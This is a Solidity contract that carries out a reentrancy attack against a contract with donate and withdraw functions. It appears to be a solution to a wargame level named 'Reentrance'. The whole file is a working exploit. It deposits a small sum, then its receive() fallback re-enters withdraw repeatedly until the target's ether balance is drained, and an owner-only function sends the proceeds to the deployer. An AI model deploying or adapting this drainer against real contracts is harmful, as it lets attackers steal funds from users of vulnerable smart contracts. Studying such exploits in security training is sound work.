// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceCaller {
    address public immutable owner;
    IReentrance private immutable i_reentrance;
    uint256 private constant DEPOSIT_AMOUNT = 0.01 ether;

    constructor(address payable _reentrance) payable {
        owner = msg.sender;
        i_reentrance = IReentrance(_reentrance);

        // Deposit initial ETH into Reentrance
        i_reentrance.donate{value: DEPOSIT_AMOUNT}(address(this));
    }

    function attack() external {
        i_reentrance.withdraw(DEPOSIT_AMOUNT);
    }

    function min(uint256 _x, uint256 _y) private pure returns (uint256) {
        return _x <= _y ? _x : _y;
    }

    receive() external payable {
        uint256 targetBalance = address(i_reentrance).balance;

        if (targetBalance > 0) {
            uint256 amountToWithdraw = min(DEPOSIT_AMOUNT, targetBalance);
            i_reentrance.withdraw(amountToWithdraw);
        }
    }

    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        (bool success,) = payable(owner).call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }
}
